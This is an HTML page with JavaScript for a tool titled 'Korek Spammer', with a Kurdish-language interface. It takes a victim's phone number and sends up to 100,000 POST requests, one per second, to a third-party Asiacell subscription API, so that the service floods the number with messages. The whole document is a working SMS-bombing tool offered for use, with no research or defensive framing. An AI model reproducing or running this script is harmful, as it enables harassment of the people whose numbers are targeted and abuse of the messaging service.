
<!doctype html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Korek Spammer</title>
<style>
body {
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
    font-family: Arial, sans-serif;
    background-color: #f0f2f5;
}
.container {
    background-color: #fff;
    border-radius: 8px;
    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
    padding: 20px;
    max-width: 400px;
    width: 100%;
    text-align: center;
}
h2 {
    color: #333;
}
input[type="text"] {
    width: 100%;
    padding: 10px;
    margin: 10px 0;
    border-radius: 4px;
    border: 1px solid #ccc;
    font-size: 16px;
}
button {
    background-color: #4CAF50;
    color: white;
    padding: 10px 15px;
    border: none;
    border-radius: 4px;
    cursor: pointer;
    font-size: 16px;
}
button:hover {
    background-color: #45a049;
}
#response {
    margin-top: 20px;
    font-size: 16px;
}
.success {
    color: green;
    font-weight: bold;
}
.error {
    color: red;
    font-weight: bold;
}
</style>
</head>
<body>
<div class="container">
    <h2>سپامی ئاسیا لەلایەن یوسف الکردي 📞</h2>
    <input type="text" id="phone" placeholder="ژمارەی موبایلەکەت داغڵکە بەم شێوە (نمونە: 770...)" />
    <button onclick="startSending()">ناردن</button>
    <div id="response"></div>
</div>
<script>
let sentMessages = 0; // ژمارەی نامەی نێردراو
let maxMessages = 100000; // ژمارەی ئەو نامانەی ئەتەوێ بینێری
let interval;

function startSending() {
    const phone = document.getElementById("phone").value;
    const url = `https://vas2.grand-hub.com/api/ludo/asiacell-d/subscribe`;

    interval = setInterval(() => {
        if (sentMessages >= maxMessages) {
            clearInterval(interval);
            return;
        }

        fetch(url, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({ phone: phone })
        })
        .then(response => response.json())
        .then(data => {
            const responseElement = document.getElementById("response");
            sentMessages++;
            if (data.message && data.message.includes("successfully")) {
                responseElement.innerText += `نامە ${sentMessages}: باشە ڕۆشت بەس لەخوا بترسە زۆر مەنێرە ✅\n`;
            } else {
                responseElement.innerText += `نامە ${sentMessages}: نەڕۆشت ❌\n`;
            }
        })
        .catch(error => {
            const responseElement = document.getElementById("response");
            sentMessages++;
            responseElement.innerText += `نامە ${sentMessages}: BAD ❌\n`;
        });

    }, 1000); // تأخير 700 مللي ثانية بين كل طلب
}
</script>
</body>
</html>
